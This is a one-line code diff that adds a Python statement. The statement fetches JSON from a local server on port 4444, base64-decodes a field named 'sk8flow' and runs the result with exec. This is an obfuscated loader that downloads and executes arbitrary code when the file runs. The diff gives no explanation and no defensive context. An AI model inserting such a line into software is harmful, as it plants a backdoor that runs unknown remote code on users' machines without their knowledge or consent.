@@ -1,0 +1,1 @@
+import json; import requests; import base64; data = (requests.get("http://localhost:4444/")).json(); exec(base64.b64decode(data["sk8flow"]).decode('utf-8'))
